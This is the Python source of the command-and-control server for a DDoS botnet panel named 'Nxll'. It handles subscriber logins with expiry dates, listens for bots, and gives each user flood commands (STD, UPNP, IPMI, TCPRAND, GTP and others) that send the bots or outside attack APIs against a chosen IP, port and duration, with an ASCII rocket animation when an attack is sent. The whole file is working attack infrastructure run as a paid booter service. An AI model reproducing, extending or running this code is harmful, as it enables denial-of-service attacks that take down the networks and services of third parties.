import socket, os, os.path
import random
from random import randrange
import time
import datetime
import threading
from scanlisten import Listener
import urllib.request
import string
import requests
from hashlib import sha256
import re
import apis
import menus

LISTENER = Listener(1337)
IP = socket.gethostbyname(socket.gethostname())
PORT = 54321
BOTCOUNT = len(LISTENER.bots)
threading.Thread(target=LISTENER.startlisten).start()

RED = "\033[1;31m"
BLACK = "\033[1;30m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
PURPLE = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',PORT))
s.listen()
def cls(conn):
    conn.send(b'\033[1;2J\033[1;H')

def msgrec(conn):
    while True:
        msg = conn.recv(99)
        if not msg.decode('utf-8') == '\r\n':break
    return msg.decode('UTF-8').strip()
def settitle(conn,title):
    conn.send(bytes(f'\033]0;{title} \007','UTF-8'))
def parsedb():
    lines=[]
    with open('db.txt','r') as f:
        for line in f.readlines():
            if not '#' in line:
                lines.append(line.split(','))
    return lines

def botcount(conn,user):
    global BOTCOUNT
    while True:
        BOTCOUNT = len(LISTENER.bots)
        conn.send(bytes(f'\033]0;[{BOTCOUNT}] Servers | Welcome {user} \007','UTF-8'))
        time.sleep(5)

def login(conn,addr):
    settitle(conn,"Welcome to Nxll")
    cls(conn)
    conn.send(b'                             \033[1;35mENTER CAPTCHA\n\r')
    answer = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    captcha = urllib.request.urlopen(f"http://artii.herokuapp.com/make?text={answer}&font=big").readlines()
    for line in captcha:
        conn.send(bytes('                    \033[1;34m' + line.decode('UTF-8') + '\r','UTF-8'))
    conn.send(b'                           \033[1;34mAnswer\033[1;35m: ')
    if not msgrec(conn) == answer:
        conn.close()
    cls(conn)
    conn.send(bytes(menus.LOGINBANNER,'UTF-8'))
    conn.send(b'\r                           \033[1;34mUsername\033[1;35m: ')
    user = msgrec(conn)
    print(repr(user))
    conn.send(b'                           \033[1;34mPassword\033[1;35m:\033[0;30m ')
    time.sleep(1)
    password = msgrec(conn)
    print(repr(password))
    login = False
    cooldown = 90
    maxtime = 100
    for line in parsedb():
        if line[0] == user and line[1] == sha256(bytes(password,"UTF-8")).hexdigest():
            login = True
            if '1' in line[2]:
                isadmin = True
            else:
                isadmin = False
            expiry = datetime.datetime.strptime(line[5].strip(), '%m/%d/%Y')
            if datetime.datetime.now() > expiry:
                conn.send(b'                           \033[1;31mAccount Expired ')
                time.sleep(5)
                conn.close()
            cooldown = int(line[4].strip())
            maxtime = int(line[3].strip())
    if not login:
        with open("failedlogins.log",'a') as f:
                    f.write("\n")
                    f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] FAILED LOGIN FROM {addr}")
        conn.close()
    else:
        with open("logins.log",'a') as f:
                    f.write("\n")
                    f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} LOGGED IN FROM {addr}")
        t= threading.Thread(target=botcount,args=(conn,user))
        t.start()
        cnc(conn,user,isadmin,maxtime,cooldown,addr)
def userIsAdmin(user):
    for line in parsedb():
        if line[0] == user and '1' in line[2]:
            return True
        else:
            return False






ROCKET = [f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r
"""
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
       \r
"""
,
       f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
      \r
      \r
      """
,
      f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
       \r
       \r
       \r
       """
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        \r
        \r
        \r
        \r
        """
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
                \r
        \r
        \r
        \r
        \r
        """
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
                 \r
        \r
        \r
        \r
        \r
        \r
         """
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
        \r
        \r
        \r
         """
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
                \r
        \r
        \r
        \r
         """
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
                \r
        \r
        \r
        \r
        \r
"""
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
                \r
        \r
        \r
        \r
        \r
        \r
"""
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
                \r
        \r
        \r
        \r
        \r
        \r
        \r
"""
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
        \r
                \r
        \r
        \r
        \r
        \r
        \r
        \r
"""
,
f"""
         {RED}/\\\r
        {WHITE}|==|\r
       {RED} |  |\r
        {RED}|  |\r
       {RED} |  |\r
       {WHITE}/____\\\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
      {RED} |    |\r
    {RED}  /| |  |\\\r
    {RED} / | |  | \\\r
 {RED}   /__|_|__|__\\\r
    {RED}   /_\\/_\\\r {YELLOW}
      ######\r
      ########\r
       ######\r
        ####\r
        ####\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
         ##\r
                 \r
        \r
        \r
        \r
        \r
                \r
        \r
        \r
        \r
        \r
        \r
        \r
        \r
""",
f"""
        {WHITE}.---.         {RED}   - S E N T !\r
       {WHITE}(_____)       {RED}  K\r
        {WHITE}\\   /      {RED}A C\r
        {BLUE}_\\o/_{RED}A T T\r
        {BLUE} //\r
       {BLUE} ( )\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r"""
,
f"""
\r
\r
\r
\r
\r
\r
\r
             {WHITE}.---.            {RED}- S E N T !\r
           {WHITE} (_____)        {RED} K\r
           {WHITE}  \   /     {RED} A C\r
           {BLUE}  _\o/_{RED}A T T\r
            {BLUE}  //\r
            {BLUE} ( )\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
""",
f"""
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
        {WHITE}.---.         {RED}   - S E N T !\r
       {WHITE}(_____)       {RED}  K\r
        {WHITE}\\   /      {RED}A C\r
        {BLUE}_\\o/_{RED}A T T\r
        {BLUE} //\r
       {BLUE} ( )\r
\r
\r
\r
\r
\r
\r
\r"""
,
f"""
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
\r
             {WHITE}.---.            {RED}- S E N T !\r
           {WHITE} (_____)        {RED} K\r
           {WHITE}  \   /     {RED} A C\r
           {BLUE}  _\o/_{RED}A T T\r
            {BLUE}  //\r
            {BLUE} ( )\r
"""
]
def validate_ip(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True
def validateint(num,lower,upper):
    try:
        num = int(num)
        if lower <= num <= upper:
            return True
        else:
            raise ValueError
    except ValueError:
        return False
def printmethods(conn):
    conn.send(bytes(f"{menus.METHODS}",'UTF-8'))
def printhelp(conn):
    conn.send(bytes(f"{menus.HELP}",'UTF-8'))
def printbasic(conn):
    conn.send(bytes(f"{menus.BASIC}",'UTF-8'))
def printhome(conn):
    conn.send(bytes(f"{menus.HOME}",'UTF-8'))
def printgame(conn):
    conn.send(bytes(f"{menus.GAME}",'UTF-8'))
def printvpn(conn):
    conn.send(bytes(f"{menus.VPN}",'UTF-8'))
def printserver(conn):
    conn.send(bytes(f"{menus.SERVER}",'UTF-8'))
def printhttp(conn):
    conn.send(bytes(f"{menus.HTTP}",'UTF-8'))
def printamp(conn):
    conn.send(bytes(f"{menus.AMP}",'UTF-8'))
def cnc(conn,user,isadmin,maxtime,cooldown,addr):
    attackdeadline = datetime.datetime.now()
    conn.send(b'\033[1;2J\033[1;H')
    if isadmin:
        PROMPT = f'                         {BLUE}{user}{PURPLE}@{BLUE}NXLL {PURPLE}# {BLUE}'
    else:
        PROMPT = f'                         {BLUE}{user}{PURPLE}@{BLUE}NXLL {PURPLE}$ {BLUE}'
    conn.send(bytes(menus.BANNER,'UTF-8'))
    while True:
        try:
            conn.send(bytes(f'\r\n\033[1;31m{PROMPT}\033[1;97m','UTF-8'))
            while True:
                msg = conn.recv(999)
                if not msg.decode('utf-8') == '\r\n':break
            msg = msg.decode('utf-8').lower().strip().split(' ')
            print(f'MESSAGE RECIEVED: {msg}')
            if 'std' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.std, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}STD {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'upnp' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.upnp, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}UPNP {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'rcmp' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.rcmp, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}RCMP {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'ipmi' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.ipmi, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}IPMI {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'tcprand' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.tcprand, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}TCPRAND {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'ts2' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.ts2, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}TS2 {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'gtp1' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.gtp1, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}GTP1 {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif 'gtp2' == msg[0]:
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,100000):
                    if int(msg[3]) > maxtime:
                        conn.send(bytes(f'                  {BLUE}Your max attack time is {PURPLE}{maxtime} {BLUE}seconds','UTF-8'))
                    elif datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                    else:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                        threading.Thread(target=LISTENER.gtp2, args=[msg[1],int(msg[2]),int(msg[3])]).start()
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}GTP2 {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
            elif msg[0].upper() in apis.APIMETHODS1.keys():
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,maxtime):
                    if datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                        continue
                    attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                    r = requests.get(apis.APILINK1.replace("{HOST}",msg[1]).replace("{PORT}",msg[2]).replace("{TIME}",msg[3]).replace("{METHODS}",apis.APIMETHODS1.get(msg[0].upper())))
                    print(r.text)
                    if r.status_code == 200:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                    else:
                        conn.send(bytes(f'                    {RED}Error sending attack','UTF-8'))
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}{msg[0]} {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
                    conn.send(bytes(f'                    {BLUE}You have a max time of {maxtime} seconds','UTF-8'))
            elif msg[0].upper() in apis.APIMETHODS2.keys():
                if len(msg) == 4 and validate_ip(msg[1]) and validateint(msg[2],0,65535) and validateint(msg[3],0,maxtime):
                    if datetime.datetime.now() < attackdeadline:
                        conn.send(bytes(f'                  {BLUE}You have an attack cooldown of {PURPLE}{cooldown} {BLUE}seconds','UTF-8'))
                        continue
                    attackdeadline = datetime.datetime.now() + datetime.timedelta(seconds=cooldown)
                    r = requests.get(apis.APILINK2.replace("{HOST}",msg[1]).replace("{PORT}",msg[2]).replace("{TIME}",msg[3]).replace("{METHODS}",apis.APIMETHODS2.get(msg[0].upper())))
                    print(r.text)
                    if r.status_code == 200:
                        with open("attacks.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} SENT {msg[0]} FLOOD TO {msg[1]}:{msg[2]} FOR {msg[3]} SECONDS FROM{addr}")
                        cls(conn)
                        i = 0
                        while i < len(ROCKET):
                            conn.send(bytes(ROCKET[i],'UTF-8'))
                            if i > len(ROCKET) - 4:
                                time.sleep(0.7)
                            else:
                                time.sleep(0.3)
                            i=i+1
                            cls(conn)
                        conn.send(bytes(menus.BANNER,'UTF-8'))
                        continue
                    else:
                        conn.send(bytes(f'                    {RED}Error sending attack','UTF-8'))
                else:
                    conn.send(bytes(f'                    {BLUE}Usage: {BLUE}{msg[0]} {PURPLE}[{BLUE}IP{PURPLE}] {PURPLE}[{BLUE}PORT{PURPLE}] {PURPLE}[{BLUE}TIME{PURPLE}]','UTF-8'))
                    conn.send(bytes(f'                    {BLUE}You have a max time of {maxtime} seconds','UTF-8'))
            elif msg[0] == 'passwd':
                conn.send(bytes(f'                         {BLUE}New Password{PURPLE}: {BLACK}','UTF-8'))
                newpass = msgrec(conn)
                if not re.match("^[A-Za-z0-9@#%]*$",newpass):
                    conn.send(bytes(f'                         {BLUE}Password can only contain letters, numbers, or @ % #','UTF-8'))
                    continue
                conn.send(bytes(f'                         {BLUE}Confirm Password{PURPLE}: {BLACK}','UTF-8'))
                if not newpass == msgrec(conn):
                    conn.send(bytes(f'                         {BLUE}Passwords do not match','UTF-8'))
                    continue
                os.system(f"./scripts/change_password.sh {user} {newpass}")
                conn.send(bytes(f'                         {BLUE}Password Changed {GREEN}Successfully','UTF-8'))
            elif 'methods' in msg[0]:
                cls(conn)
                printmethods(conn)
            elif 'help' in msg[0] or '?' in msg[0]:
                cls(conn)
                printhelp(conn)
            elif 'basic' == msg[0]:
                cls(conn)
                printbasic(conn)
